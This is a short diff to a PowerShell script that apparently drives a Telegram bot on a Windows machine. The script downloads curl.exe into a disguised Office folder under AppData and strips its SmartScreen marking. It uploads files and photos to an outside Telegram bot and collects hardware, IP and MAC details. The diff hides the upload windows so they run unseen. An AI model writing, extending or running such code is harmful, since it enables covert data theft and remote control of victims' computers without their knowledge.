@@ -11,8 +11,7 @@ $ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
 $curl = $ruta + "\" + "curl.exe"
 $curl_mod = $ruta + "\" + "curl_mod.exe"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
-if ( (Test-Path $curl) -eq $false ) {
-$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://github.com/cybervaca/psbotelegram/raw/master/curl.exe","$curl")
+if ( (Test-Path $curl) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://github.com/cybervaca/psbotelegram/raw/master/curl.exe","$curl")
 
 Disable-Smartscreen -File $curl -Output $curl_mod
 Remove-Item $curl
@@ -22,14 +21,14 @@ if ($file -ne $null) {
 $proceso = $curl_mod
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
 $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '
-Start-Process $proceso -ArgumentList $argumenlist }
+Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden}
 
 if ($photo -ne $null){
 
 $proceso = $curl_mod
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
 $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
-Start-Process $proceso -ArgumentList $argumenlist 
+Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden
 
 
 }
@@ -64,9 +63,6 @@ $PC = New-Object psobject -Property @{
 "Numero de serie" = $serialnumer
 "Disco Duro" = $Disco_duro
 }
-
-################################## Exportamos los datos del equipo que esta pasando por el "FOR" al csv ##############################################
-
 
 $PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
 }
